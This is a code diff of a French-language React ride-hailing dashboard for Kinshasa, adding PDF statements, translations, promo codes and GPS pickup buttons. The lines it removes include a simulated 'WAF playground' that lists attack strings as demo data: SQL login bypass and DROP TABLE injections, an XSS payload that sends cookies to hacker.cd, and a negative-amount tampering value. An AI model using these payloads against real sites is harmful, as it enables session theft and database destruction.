+      doc.text(typeLabel, 14, yPos);
+
+      doc.setFont("helvetica", "normal");
+      doc.setTextColor(50, 50, 50);
+      doc.text(`${tx.amount.toLocaleString("fr-FR")} ${tx.currency}`, 45, yPos);
+
+      doc.text(`Méthode: ${tx.method}`, 90, yPos);
+      doc.text(`${tx.date}`, 145, yPos);
+
+      yPos += 8;
+      
+      doc.setDrawColor(240, 240, 240);
+      doc.line(14, yPos - 3, 196, yPos - 3);
     });
 
-    onUpdateProfile({
-      ...profile,
-      walletBalanceCDF: newCDFBand,
-      walletBalanceUSD: parseFloat(newUSDBand.toFixed(2)),
-      referralCount: newCount
-    });
-
-    setReferralFeedback(`🎉 Succès ! ${invitedName} s'est inscrit en utilisant votre code parrainage ! Plus de bonus crédité sur votre compte : +15 000 CDF et +$5.00 USD.`);
-    setInvitedName("");
-    setInvitedPhone("+243 ");
-
-    setTimeout(() => {
-      setReferralFeedback("");
-    }, 10000);
-  };
-
-  // Execution of simulated hacks from the security playground
-  const handleExecuteSimulatedAttack = () => {
-    let rawInput = "";
-    let threatType: SecurityEvent["threatType"] = "SQL Injection (SQLi)";
-    let details = "";
-    let riskScore: "MEDIUM" | "HIGH" | "CRITICAL" = "HIGH";
-
-    if (selectedSimulatedAttack === "sqli_bypass") {
-      rawInput = "admin' OR 1=1; --";
-      threatType = "SQL Injection (SQLi)";
-      riskScore = "CRITICAL";
-      details = "Tentative d'évasion SQL pour court-circuiter l'authentification admin par ruse de commentaire '--'.";
-    } else if (selectedSimulatedAttack === "sqli_ddl") {
-      rawInput = "5000; DROP TABLE WalletTransactions; --";
-      threatType = "SQL Injection (SQLi)";
-      riskScore = "CRITICAL";
-      details = "Injection de commandes DDL malveillantes cherchant à altérer la structure de la base de données.";
-    } else if (selectedSimulatedAttack === "xss_cookie_steal") {
-      rawInput = "<script>document.location='http://hacker.cd/steal?c='+document.cookie</script>";
-      threatType = "Cross-Site Scripting (XSS)";
-      riskScore = "HIGH";
-      details = "Tentative d'extraction de jetons de session locale par chargement de script distant.";
-    } else if (selectedSimulatedAttack === "xss_img_onerror") {
-      rawInput = "<img src=x onerror=alert('GoMoto_Defaced')>";
-      threatType = "Cross-Site Scripting (XSS)";
-      riskScore = "HIGH";
-      details = "Injection XSS cherchant à détériorer le visuel de la carte ou des éléments de course.";
-    } else if (selectedSimulatedAttack === "parameter_negative_recharge") {
-      rawInput = "rechargeAmount=-500000";
-      threatType = "Falsification de Paramètres";
-      riskScore = "CRITICAL";
-      details = "Contournement des limites du montant en modifiant l'état client pour de faux décaissements.";
-    } else if (selectedSimulatedAttack === "brute_force_flood") {
-      rawInput = "68 requêtes par seconde";
-      threatType = "Tentative Force Brute / Déni de Service (DDoS)";
-      riskScore = "HIGH";
-      details = "Saturation de l'API de géolocalisation par envois automatisés.";
-    }
-
-    const { ip, commune } = getRandomKinshasaIP();
-    const newSim: SecurityEvent = {
-      id: "sh-evt-" + Math.random().toString(36).substr(2, 6),
-      timestamp: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
-      threatType,
-      rawInput,
-      sourceIp: `${ip} (${commune})`,
-      actionTaken: threatType.includes("Force Brute") ? "ADRESSE IP VERROUILLÉE" : "BLOCKED & REJETÉ",
-      riskScore,
-      location: `Kinshasa ${commune}`,
-      details
-    };
-
-    if (threatType.includes("Force Brute")) {
-      setIpBanCountdown(60);
-    }
-
-    setSecurityEvents(prev => [newSim, ...prev]);
-    setBlockedAttack(newSim);
-  };
-
-  const handleTriggerIntegrityCheck = () => {
-    setIsIntegrityChecking(true);
-    setIntegrityStatus("checking");
-    setTimeout(() => {
-      setIsIntegrityChecking(false);
-      setIntegrityStatus("secure");
-    }, 1800);
+    doc.save(`gomoto_wallet_transactions_${new Date().getTime()}.pdf`);
+    showToast("success", "Export PDF", "Le relevé PDF a été généré avec succès.");
   };
 
   // Modification Request submit
@@ -2202,7 +2320,7 @@ export default function ClientDashboard({
       </div>
 
       {/* Sticky Network Resilience Indicator Banner */}
-      {(!isOnline || offlineModeSimulated) && (
+      {!isOnline && (
         <div id="offline-network-banner" className="lg:col-span-12 bg-amber-50 border border-amber-200 text-slate-800 p-4 rounded-3xl flex flex-col md:flex-row gap-4 items-center justify-between text-left animate-fade-in shadow-sm">
           <div className="flex items-center gap-3">
             <div className="bg-amber-100 p-2 rounded-2xl text-amber-700 animate-pulse">
@@ -2231,7 +2349,7 @@ export default function ClientDashboard({
         {/* Profile Card & Info overview */}
         <div className="bg-white border border-slate-200 rounded-3xl p-5 shadow-sm relative overflow-hidden text-slate-800">
           <div className="absolute top-0 right-0 bg-blue-600 text-white font-bold text-[9px] px-3 py-1 rounded-bl-xl uppercase tracking-wider">
-            Passager
+            {translations[lang]?.roleClient || "Passager"}
           </div>
 
           <div className="flex items-center gap-4">
@@ -2255,11 +2373,11 @@ export default function ClientDashboard({
           {/* Quick wallet balances */}
           <div className="grid grid-cols-2 gap-2 mt-4 pt-4 border-t border-slate-100">
             <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-200 text-center">
-              <span className="text-[8px] font-bold text-slate-400 uppercase tracking-widest block">Wallet CDF</span>
+              <span className="text-[8px] font-bold text-slate-400 uppercase tracking-widest block">{translations[lang]?.balanceCDF || "Solde CDF"}</span>
               <span className="text-xs font-bold text-emerald-700 block mt-0.5">{profile.walletBalanceCDF.toLocaleString("fr-FR")} CDF</span>
             </div>
             <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-200 text-center">
-              <span className="text-[8px] font-bold text-slate-400 uppercase tracking-widest block">Wallet USD</span>
+              <span className="text-[8px] font-bold text-slate-400 uppercase tracking-widest block">{translations[lang]?.balanceUSD || "Solde USD"}</span>
               <span className="text-xs font-bold text-blue-700 block mt-0.5">${profile.walletBalanceUSD.toFixed(2)} USD</span>
             </div>
           </div>
@@ -2280,7 +2398,7 @@ export default function ClientDashboard({
                   }`}
                 >
                   <Compass className={`w-4 h-4 ${activeTab === "ride" ? "text-white" : "text-blue-650"}`} />
-                  <span className="flex-1 text-left">Commander une course</span>
+                  <span className="flex-1 text-left">{translations[lang]?.tabRide || "Commander"}</span>
                   <ChevronRight className="w-3.5 h-3.5 opacity-60" />
                 </button>
 
@@ -2295,7 +2413,7 @@ export default function ClientDashboard({
                   }`}
                 >
                   <Clock className={`w-4 h-4 ${activeTab === "history" ? "text-white" : "text-amber-505"}`} />
-                  <span className="flex-1 text-left">Historique des courses</span>
+                  <span className="flex-1 text-left">{translations[lang]?.tabHistory || "Historique"}</span>
                   <ChevronRight className="w-3.5 h-3.5 opacity-60" />
                 </button>
               </div>
@@ -2315,7 +2433,7 @@ export default function ClientDashboard({
                   }`}
                 >
                   <CreditCard className={`w-4 h-4 ${activeTab === "wallet" ? "text-white" : "text-emerald-650"}`} />
-                  <span className="flex-1 text-left">Mon Wallet REPARO</span>
+                  <span className="flex-1 text-left">{translations[lang]?.tabWallet || "Wallet"}</span>
                   <ChevronRight className="w-3.5 h-3.5 opacity-60" />
                 </button>
 
@@ -2330,12 +2448,42 @@ export default function ClientDashboard({
                   }`}
                 >
                   <HelpCircle className={`w-4 h-4 ${activeTab === "disputes" ? "text-white" : "text-rose-505"}`} />
-                  <span className="flex-1 text-left">Litiges & Remboursements</span>
+                  <span className="flex-1 text-left">{translations[lang]?.tabDisputes || "Litiges"}</span>
                   {disputes.length > 0 && (
                     <span className="bg-rose-100 text-rose-700 text-[8px] font-bold px-1.5 py-0.2 rounded font-mono">
                       {disputes.length}
                     </span>
                   )}
+                  <ChevronRight className="w-3.5 h-3.5 opacity-60" />
+                </button>
+
+                <button
+                  type="button"
+                  id="tab-btn-chat"
+                  onClick={() => setActiveTab("chat")}
+                  className={`w-full flex items-center gap-2.5 px-3.5 py-2.5 rounded-2xl text-[11px] font-bold transition-all cursor-pointer ${
+                    activeTab === "chat"
+                      ? "bg-blue-600 text-white shadow-sm font-black translate-x-1"
+                      : "text-slate-600 hover:text-slate-900 bg-white hover:bg-slate-100 border border-slate-200"
+                  }`}
+                >
+                  <MessageSquare className={`w-4 h-4 ${activeTab === "chat" ? "text-white" : "text-amber-550"}`} />
+                  <span className="flex-1 text-left">Google Chat Support</span>
+                  <ChevronRight className="w-3.5 h-3.5 opacity-60" />
+                </button>
+
+                <button
+                  type="button"
+                  id="tab-btn-promotions"
+                  onClick={() => setActiveTab("promotions")}
+                  className={`w-full flex items-center gap-2.5 px-3.5 py-2.5 rounded-2xl text-[11px] font-bold transition-all cursor-pointer ${
+                    activeTab === "promotions"
+                      ? "bg-blue-600 text-white shadow-sm font-black translate-x-1 font-sans"
+                      : "text-slate-600 hover:text-slate-900 bg-white hover:bg-slate-100 border border-slate-200 font-sans"
+                  }`}
+                >
+                  <Gift className={`w-4 h-4 ${activeTab === "promotions" ? "text-white" : "text-amber-500"}`} />
+                  <span className="flex-1 text-left font-bold">{lang === "en" ? "Offers & Loyalty" : "Offres & Fidélité"}</span>
                   <ChevronRight className="w-3.5 h-3.5 opacity-60" />
                 </button>
               </div>
@@ -2355,24 +2503,10 @@ export default function ClientDashboard({
                   }`}
                 >
                   <User className={`w-4 h-4 ${activeTab === "profile" ? "text-white" : "text-indigo-505"}`} />
-                  <span className="flex-1 text-left">Paramètres & Préférences</span>
+                  <span className="flex-1 text-left">{translations[lang]?.tabProfile || "Profil"}</span>
                   <ChevronRight className="w-3.5 h-3.5 opacity-60" />
                 </button>
 
-                <button
-                  type="button"
-                  id="tab-btn-security"
-                  onClick={() => setActiveTab("security")}
-                  className={`w-full flex items-center gap-2.5 px-3.5 py-2.5 rounded-2xl text-[11px] font-bold transition-all cursor-pointer ${
-                    activeTab === "security"
-                      ? "bg-red-600 text-white shadow-sm font-black translate-x-1"
-                      : "text-red-500 hover:text-red-700 bg-red-50 hover:bg-white border border-red-105"
-                  }`}
-                >
-                  <Shield className="w-4 h-4" />
-                  <span className="flex-1 text-left">Sécurité & Playground WAF</span>
-                  <ChevronRight className="w-3.5 h-3.5 opacity-60" />
-                </button>
               </div>
             </div>
           </div>
@@ -2386,7 +2520,7 @@ export default function ClientDashboard({
                  activeTab === "ride" ? "bg-white text-slate-800 shadow-sm font-black" : "text-slate-500 hover:text-slate-800"
                }`}
             >
-              Commander
+              {translations[lang]?.tabRide || "Commander"}
             </button>
             <button
                type="button"
@@ -2395,7 +2529,7 @@ export default function ClientDashboard({
                  activeTab === "history" ? "bg-white text-slate-800 shadow-sm font-black" : "text-slate-500 hover:text-slate-800"
                }`}
             >
-              Historique
+              {translations[lang]?.tabHistory || "Historique"}
             </button>
             <button
                type="button"
@@ -2404,7 +2538,7 @@ export default function ClientDashboard({
                  activeTab === "wallet" ? "bg-white text-slate-800 shadow-sm font-black" : "text-slate-500 hover:text-slate-800"
                }`}
             >
-              Wallet
+              {translations[lang]?.tabWallet || "Wallet"}
             </button>
             <button
                type="button"
@@ -2413,7 +2547,16 @@ export default function ClientDashboard({
                  activeTab === "disputes" ? "bg-white text-slate-800 shadow-sm font-black" : "text-slate-500 hover:text-slate-800"
                }`}
             >
-              Litiges
+              {translations[lang]?.tabDisputes || "Litiges"}
+            </button>
+            <button
+               type="button"
+               onClick={() => setActiveTab("promotions")}
+               className={`flex-1 text-center py-2 rounded-lg text-[10px] font-bold tracking-wider uppercase transition-all cursor-pointer ${
+                 activeTab === "promotions" ? "bg-white text-slate-800 shadow-sm font-black" : "text-slate-500 hover:text-slate-800"
+               }`}
+            >
+              {lang === "en" ? "Offers" : "Offres"}
             </button>
             <button
                type="button"
@@ -2422,17 +2565,7 @@ export default function ClientDashboard({
                  activeTab === "profile" ? "bg-white text-slate-800 shadow-sm font-black" : "text-slate-500 hover:text-slate-800"
                }`}
             >
-              Profil
-            </button>
-            <button
-               type="button"
-               onClick={() => setActiveTab("security")}
-               className={`flex-1 text-center py-2 rounded-lg text-[10px] tracking-wider uppercase transition-all flex items-center justify-center gap-1 cursor-pointer font-bold ${
-                 activeTab === "security" ? "bg-red-600 text-white shadow-sm font-black" : "text-red-500 hover:text-red-700"
-               }`}
-            >
-              <Shield className="w-3.5 h-3.5" />
-              <span>Sécurité</span>
+              {translations[lang]?.tabProfile || "Profil"}
             </button>
           </div>
         </div>
@@ -2467,6 +2600,27 @@ export default function ClientDashboard({
               </div>
             </div>
 
+            {/* OTP SECURITY PIN FOR START RIDE */}
+            {rideStatus === "accepted" && (() => {
+              try {
+                const actRide = JSON.parse(localStorage.getItem("gomoto_active_ride") || "{}");
+                if (actRide?.securityPin) {
+                  return (
+                    <div className="mt-4 bg-purple-50 border border-purple-200 p-3.5 rounded-2xl flex items-center justify-between text-left shadow-sm">
+                      <div>
+                        <span className="text-[10px] font-black text-purple-600 block uppercase tracking-wider flex items-center gap-1.5"><Key className="w-3.5 h-3.5" /> Code de Sécurité</span>
+                        <span className="text-[9px] text-slate-600 block mt-0.5 leading-tight">Donnez ce PIN au motard pour qu'il puisse démarrer la course.</span>
+                      </div>
+                      <div className="bg-white px-3 py-1.5 rounded-xl border border-purple-200 shadow-sm">
+                        <span className="text-lg font-mono font-black text-slate-800 tracking-widest">{actRide.securityPin}</span>
+                      </div>
+                    </div>
+                  );
+                }
+              } catch (e) {}
+              return null;
+            })()}
+
             {/* Ride state information */}
             <div className="mt-4 space-y-2.5">
               <div className="flex justify-between items-center text-[11px] bg-white p-2.5 rounded-xl border border-slate-200">
@@ -2492,6 +2646,18 @@ export default function ClientDashboard({
                 <Smartphone className="w-3.5 h-3.5 text-slate-500" />
                 <span>Appeler Motard</span>
               </a>
+            </div>
+
+            {/* Live ETA Tracking & Progress Line */}
+            <div className="mt-4 bg-emerald-50 border border-emerald-500/20 p-3 rounded-2xl flex items-start gap-2.5 shadow-sm text-left">
+              <div className="bg-emerald-600/10 text-emerald-600 p-2 rounded-xl border border-emerald-500/10 mt-0.5 shrink-0">
+                <ShieldCheck className="w-5 h-5 text-emerald-500" />
+              </div>
+              <div>
+                <span className="text-[8px] font-extrabold text-emerald-600 uppercase tracking-widest block font-mono">AUDIT DE SÉCURITÉ GOMOTO RDC • CONFORME 100%</span>
+                <span className="font-extrabold text-[10.5px] text-slate-800 block">Double Enrôlement National Validé</span>
+                <span className="text-[9.5px] text-slate-500 block leading-tight mt-0.5">La moto et le chauffeur motard sont doublement affiliés à leur propriétaire légal d'actifs et certifiés conformes par l'Hôtel de Ville de Kinshasa. Assurances à jour.</span>
+              </div>
             </div>
 
             {/* Live ETA Tracking & Progress Line */}
@@ -2641,14 +2807,35 @@ export default function ClientDashboard({
           <div className="space-y-6">
             {/* Simulated Live Map */}
             <div className="bg-white border border-slate-200 rounded-3xl p-4 shadow-sm space-y-3">
-              <div className="flex justify-between items-center text-xs">
+              <div className="flex justify-between items-center text-xs flex-wrap gap-2">
                 <span className="font-bold text-slate-700 uppercase tracking-widest flex items-center gap-1">
                   <Compass className="w-4 h-4 text-blue-600" />
                   <span>Géolocalisation en temps réel (Congo)</span>
                 </span>
-                <span className="bg-emerald-50 text-emerald-700 border border-emerald-200 px-2 py-0.5 rounded font-mono font-bold text-[9px] animate-pulse">
-                  GPS ACTIF
-                </span>
+                <div className="flex items-center gap-1.5">
+                  <button
+                    type="button"
+                    onClick={() => setMapViewMode("live")}
+                    className={`px-2.5 py-1 rounded-xl font-bold text-[9px] uppercase tracking-wider border transition-all cursor-pointer ${
+                      mapViewMode === "live"
+                        ? "bg-blue-600 text-white border-blue-600 shadow-sm font-black"
+                        : "bg-slate-50 text-slate-650 hover:bg-slate-100 border-slate-200"
+                    }`}
+                  >
+                    Google Maps (Live) 🌍
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => setMapViewMode("simulator")}
+                    className={`px-2.5 py-1 rounded-xl font-bold text-[9px] uppercase tracking-wider border transition-all cursor-pointer ${
+                      mapViewMode === "simulator"
+                        ? "bg-slate-800 text-white border-slate-850 shadow-sm font-black"
+                        : "bg-slate-50 text-slate-650 hover:bg-slate-100 border-slate-200"
+                    }`}
+                  >
+                    Simulateur (SVG) 🇨🇩
+                  </button>
+                </div>
               </div>
               
               <WeatherAlert 
@@ -2663,34 +2850,163 @@ export default function ClientDashboard({
                 lang={lang} 
               />
 
-              <MapSimulator
-                address={{
-                  ...profile.address,
-                  province: drcProvinces.find(p => p.id === selectedProvinceId)?.name || selectedProvinceId,
-                  city: selectedCityName,
-                  commune: selectedCommuneName,
-                }}
-                pickupAddress={{
-                  ...profile.address,
-                  province: drcProvinces.find(p => p.id === selectedProvinceId)?.name || selectedProvinceId,
-                  city: selectedCityName,
-                  commune: selectedCommuneName,
-                  avenue: pickupRoad,
-                }}
-                dropoffAddress={{
-                  ...profile.address,
-                  province: drcProvinces.find(p => p.id === selectedProvinceId)?.name || selectedProvinceId,
-                  city: selectedCityName,
-                  commune: selectedCommuneName,
-                  avenue: dropoffRoad,
-                }}
-                isRideActive={rideStatus !== "idle"}
-                rideStatus={rideStatus === "idle" ? undefined : rideStatus}
-                driverPosition={driverPos}
-                passengerPosition={passengerPos}
-                onMapClick={handleMapSelection}
-              />
+              {mapViewMode === "live" ? (
+                <LiveMapTracking
+                  provinceName={drcProvinces.find(p => p.id === selectedProvinceId)?.name || selectedProvinceId}
+                  cityName={selectedCityName}
+                  communeName={selectedCommuneName}
+                  pickupRoad={pickupRoad}
+                  dropoffRoad={dropoffRoad}
+                  lang={lang}
+                  onSwitchToLocalSimulator={() => setMapViewMode("simulator")}
+                />
+              ) : (
+                <MapSimulator
+                  address={{
+                     ...profile.address,
+                     province: drcProvinces.find(p => p.id === selectedProvinceId)?.name || selectedProvinceId,
+                     city: selectedCityName,
+                     commune: selectedCommuneName,
+                  }}
+                  pickupAddress={{
+                    ...profile.address,
+                    province: drcProvinces.find(p => p.id === selectedProvinceId)?.name || selectedProvinceId,
+                    city: selectedCityName,
+                    commune: selectedCommuneName,
+                    avenue: pickupRoad,
+                  }}
+                  dropoffAddress={{
+                    ...profile.address,
+                    province: drcProvinces.find(p => p.id === selectedProvinceId)?.name || selectedProvinceId,
+                    city: selectedCityName,
+                    commune: selectedCommuneName,
+                    avenue: dropoffRoad,
+                  }}
+                  isRideActive={rideStatus !== "idle"}
+                  rideStatus={rideStatus === "idle" ? undefined : rideStatus}
+                  driverPosition={driverPos}
+                  passengerPosition={passengerPos}
+                  onMapClick={handleMapSelection}
+                />
+              )}
             </div>
+
+            {/* Prominent Active Promotions Spotlight Banner */}
+            {rideStatus === "idle" && (
+              <div 
+                id="active-promotions-spotlight-banner"
+                className="bg-gradient-to-r from-amber-50 through-orange-50 to-amber-50 border border-amber-200 rounded-3xl p-4 shadow-sm space-y-3.5 text-left text-slate-850"
+              >
+                <div className="flex justify-between items-center">
+                  <div className="flex items-center gap-2">
+                    <span className="text-base">🏷️</span>
+                    <div>
+                      <h4 className="font-extrabold text-slate-900 text-xs uppercase tracking-wider">Promotions & Bonnes Offres</h4>
+                      <p className="text-[9.5px] text-amber-800 font-medium">Bénéficiez de remises immédiates sur vos courses de ce jour.</p>
+                    </div>
+                  </div>
+                  <button
+                    type="button"
+                    onClick={() => setActiveTab("promotions")}
+                    className="text-[9.5px] font-extrabold text-blue-600 hover:text-blue-700 hover:underline flex items-center gap-1 uppercase tracking-wider bg-white rounded-lg px-2 py-1 border border-slate-200/50 shadow-xs cursor-pointer"
+                  >
+                    <span>Voir tout</span>
+                    <span>→</span>
+                  </button>
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                  {/* Local Offres Spéciales */}
+                  <div className="bg-white/80 p-3 rounded-2xl border border-amber-200/50 flex flex-col justify-between">
+                    <div>
+                      <span className="bg-orange-100 text-orange-850 text-[8px] font-black uppercase px-2 py-0.5 rounded-full inline-block mb-1.5 font-mono">Offre Limitée Active</span>
+                      <h5 className="font-bold text-slate-850 text-xs">⚡ Kalamu Weekend Special</h5>
+                      <p className="text-[9.5px] text-slate-500 mt-0.5 leading-relaxed">
+                        Voyagez malin avec 20% de réduction vers Kalamu ce week-end !
+                      </p>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        const foundCode: DiscountCode = {
+                          id: "promo-kns20",
+                          code: "KNS20",
+                          discountType: "percent",
+                          discountValue: 20,
+                          minRideAmountCDF: 3000,
+                          maxDiscountCDF: 4000,
+                          validFrom: "2026-01-01",
+                          validTo: "2026-12-31",
+                          usageLimit: 500,
+                          timesUsed: 42,
+                          active: true,
+                          description: "20% de réduction sur vos trajets de plus de 3.000 CDF (Max 4.000 CDF)."
+                        };
+                        setAppliedPromo(foundCode);
+                        alert("Code promotionnel KNS20 (-20%) appliqué automatiquement ! Le prix estimé ci-dessous a été réduit.");
+                      }}
+                      className="mt-3 bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-white font-extrabold text-[9px] uppercase tracking-widest py-1.5 px-3 rounded-xl transition shadow-xs text-center cursor-pointer"
+                    >
+                      Appliquer Code KNS20 (-20%)
+                    </button>
+                  </div>
+
+                  {/* Coupon Code Shortcut */}
+                  <div className="bg-white/80 p-3 rounded-2xl border border-amber-200/50 flex flex-col justify-between">
+                    <div>
+                      <span className="bg-blue-100 text-blue-800 text-[8px] font-black uppercase px-2 py-0.5 rounded-full inline-block mb-1.5 font-mono">Forfait Fixe</span>
+                      <h5 className="font-bold text-slate-850 text-xs">🎁 Bon Forfaitaire Immédiat</h5>
+                      <p className="text-[9.5px] text-slate-500 mt-0.5 leading-relaxed">
+                        Économisez instantanément un montant fixe de 1.500 CDF sur toute course.
+                      </p>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        const foundCode: DiscountCode = {
+                          id: "promo-gomoto5",
+                          code: "GOMOTO5",
+                          discountType: "fixed",
+                          discountValue: 1500,
+                          minRideAmountCDF: 2000,
+                          maxDiscountCDF: 1500,
+                          validFrom: "2026-01-01",
+                          validTo: "2026-12-31",
+                          usageLimit: 1000,
+                          timesUsed: 189,
+                          active: true,
+                          description: "Réduction fixe immédiate de 1.500 CDF sur n'importe quel trajet !"
+                        };
+                        setAppliedPromo(foundCode);
+                        alert("Forfait GOMOTO5 (-1500 CDF) appliqué automatiquement !");
+                      }}
+                      className="mt-3 bg-slate-800 hover:bg-slate-900 text-white font-extrabold text-[9px] uppercase tracking-widest py-1.5 px-3 rounded-xl transition shadow-xs text-center cursor-pointer"
+                    >
+                      Utiliser Forfait GOMOTO5
+                    </button>
+                  </div>
+                </div>
+
+                {appliedPromo && (
+                  <div className="bg-emerald-500/10 border border-emerald-500/20 p-2.5 rounded-2xl flex items-center justify-between text-xs text-emerald-800">
+                    <span className="font-semibold flex items-center gap-1.5 text-[11px]">
+                      ✨ Réduction active : <b className="font-extrabold bg-emerald-100 px-1.5 py-0.5 rounded font-mono text-emerald-950">{appliedPromo.code}</b> 
+                      ({appliedPromo.discountType === "percent" ? `${appliedPromo.discountValue}%` : `${appliedPromo.discountValue} CDF`})
+                    </span>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setAppliedPromo(null);
+                        alert("Code promotionnel désactivé.");
+                      }}
+                      className="text-[9.5px] font-bold text-rose-600 hover:text-rose-700 underline cursor-pointer"
+                    >
+                      Annuler
+                    </button>
+                  </div>
+                )}
+              </div>
+            )}
 
             {/* Setup Destination / Trip request form */}
             {rideStatus === "idle" ? (
@@ -2701,12 +3017,12 @@ export default function ClientDashboard({
                       <Navigation className="w-5 h-5 animate-pulse" />
                     </div>
                     <div>
-                      <h3 className="font-bold text-slate-900 text-sm">Simulateur d'Itinéraire Contractuel</h3>
-                      <p className="text-[10px] text-slate-500">Planifiez votre itinéraire congolais avec tarif certifié par la Mairie avant commande.</p>
+                      <h3 className="font-bold text-slate-900 text-sm">Estimateur de Coût & Itinéraire (Géo-Temps Réel)</h3>
+                      <p className="text-[10px] text-slate-500">Estimez en temps réel le coût de votre trajet basé sur la distance et le tarif de votre province.</p>
                     </div>
                   </div>
                   <span className="bg-blue-50 text-blue-700 font-mono text-[9px] px-2 py-0.5 rounded-md font-bold uppercase tracking-wider">
-                    Calculateur API
+                    ESTIMATEUR
                   </span>
                 </div>
 
@@ -2851,9 +3167,31 @@ export default function ClientDashboard({
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   {/* Pickup Avenue */}
                   <div className="space-y-1 text-left">
-                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider flex items-center gap-1">
-                      <MapPin className="w-3" />
-                      <span>Avenue de Départ ({selectedCommuneName})</span>
+                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider flex items-center justify-between gap-1">
+                      <div className="flex items-center gap-1">
+                        <MapPin className="w-3" />
+                        <span>Avenue de Départ ({selectedCommuneName})</span>
+                      </div>
+                      <button
+                        type="button"
+                        onClick={() => {
+                          if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition((pos) => {
+                              const gpsString = `Point GPS (${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)})`;
+                              setPickupRoad(gpsString);
+                              setIsSimulatingItinerary(true);
+                              setTimeout(() => setIsSimulatingItinerary(false), 1000);
+                            }, () => {
+                              alert("Veuillez autoriser l'accès au GPS dans votre navigateur.");
+                            });
+                          } else {
+                            alert("La localisation GPS n'est pas supportée par votre navigateur.");
+                          }
+                        }}
+                        className="text-[9px] bg-blue-100 text-blue-700 font-bold px-2 py-1 rounded cursor-pointer hover:bg-blue-200 transition-all ml-auto uppercase tracking-wider shadow-sm flex items-center gap-1"
+                      >
+                        📍 Utiliser Mon GPS
+                      </button>
                     </label>
                     <select
                       value={pickupRoad}
@@ -2864,6 +3202,11 @@ export default function ClientDashboard({
                       }}
                       className="w-full bg-slate-50 border border-slate-200 text-slate-800 rounded-xl px-3 py-2 text-xs focus:border-blue-600 outline-none cursor-pointer"
                     >
+                      {pickupRoad.startsWith("Point GPS") && (
+                        <option value={pickupRoad} className="text-blue-800 font-bold bg-blue-50">
+                          {pickupRoad} (Lat/Lng)
+                        </option>
+                      )}
                       <option value={profile.address.avenue} className="text-slate-800">
                         {profile.address.avenue} (Mon domicile)
                       </option>
@@ -2877,9 +3220,31 @@ export default function ClientDashboard({
 
                   {/* Dropoff Avenue */}
                   <div className="space-y-1 text-left">
-                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider flex items-center gap-1">
-                      <MapPin className="w-3 text-red-550" />
-                      <span>Avenue de Destination</span>
+                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider flex items-center justify-between gap-1">
+                      <div className="flex items-center gap-1">
+                        <MapPin className="w-3 text-red-550" />
+                        <span>Avenue de Destination</span>
+                      </div>
+                      <button
+                        type="button"
+                        onClick={() => {
+                          if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition((pos) => {
+                              const gpsString = `Point GPS (${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)})`;
+                              setDropoffRoad(gpsString);
+                              setIsSimulatingItinerary(true);
+                              setTimeout(() => setIsSimulatingItinerary(false), 1000);
+                            }, () => {
+                              alert("Veuillez autoriser l'accès au GPS dans votre navigateur.");
+                            });
+                          } else {
+                            alert("La localisation GPS n'est pas supportée par votre navigateur.");
+                          }
+                        }}
+                        className="text-[9px] bg-red-50 text-red-700 font-bold px-2 py-1 rounded cursor-pointer hover:bg-red-100 transition-all ml-auto uppercase tracking-wider shadow-sm flex items-center gap-1 border border-red-100"
+                      >
+                        📍 Mon GPS
+                      </button>
                     </label>
                     <select
                       value={dropoffRoad}
@@ -2890,6 +3255,11 @@ export default function ClientDashboard({
                       }}
                       className="w-full bg-slate-50 border border-slate-200 text-slate-800 rounded-xl px-3 py-2 text-xs focus:border-blue-600 outline-none cursor-pointer"
                     >
+                      {dropoffRoad.startsWith("Point GPS") && (
+                        <option value={dropoffRoad} className="text-red-800 font-bold bg-red-50">
+                          {dropoffRoad} (Lat/Lng)
+                        </option>
+                      )}
                       {mockAvenues
                         .filter((av) => av !== pickupRoad)
                         .map((av, idx) => (
@@ -3012,29 +3382,270 @@ export default function ClientDashboard({
                         )}
                       </p>
                     </div>
-                    <p className="text-xs font-extrabold text-emerald-700 mt-1.5 pt-1 border-t border-slate-200/60 block">
-                      Tarif Total Certifié : {prices.cdf.toLocaleString()} CDF{" "}
-                      <span className="text-slate-450 font-normal">(${prices.usd} USD)</span>
-                    </p>
+                    {finalPrices.applied ? (
+                      <div className="mt-1.5 pt-1 border-t border-slate-200/60 block space-y-1 text-left">
+                        <div className="flex items-center gap-1.5 text-[9.5px] text-slate-500">
+                          <span className="line-through">{prices.cdf.toLocaleString()} CDF (~${prices.usd})</span>
+                          <span className="bg-emerald-100 text-emerald-800 font-black px-1.5 py-0.5 rounded text-[8px] uppercase">
+                            -{appliedPromo?.discountType === "percent" ? `${appliedPromo?.discountValue}%` : `${appliedPromo?.discountValue} CDF`} !
+                          </span>
+                        </div>
+                        <p className="text-xs font-extrabold text-emerald-800">
+                          Tarif Promotionnel : <span className="font-mono font-black text-sm">{finalPrices.cdf.toLocaleString()} CDF</span>{" "}
+                          <span className="text-slate-500 font-normal">(${finalPrices.usd} USD)</span>
+                        </p>
+                      </div>
+                    ) : (
+                      <p className="text-xs font-extrabold text-emerald-700 mt-1.5 pt-1 border-t border-slate-200/60 block">
+                        Tarif Total Certifié : {prices.cdf.toLocaleString()} CDF{" "}
+                        <span className="text-slate-450 font-normal">(${prices.usd} USD)</span>
+                      </p>
+                    )}
                   </div>
 
-                  <button
-                    type="button"
-                    onClick={() => {
-                      setIsSimulatingItinerary(true);
-                      setTimeout(() => {
-                        setIsSimulatingItinerary(false);
-                        handleRequestRide();
-                      }, 1000);
-                    }}
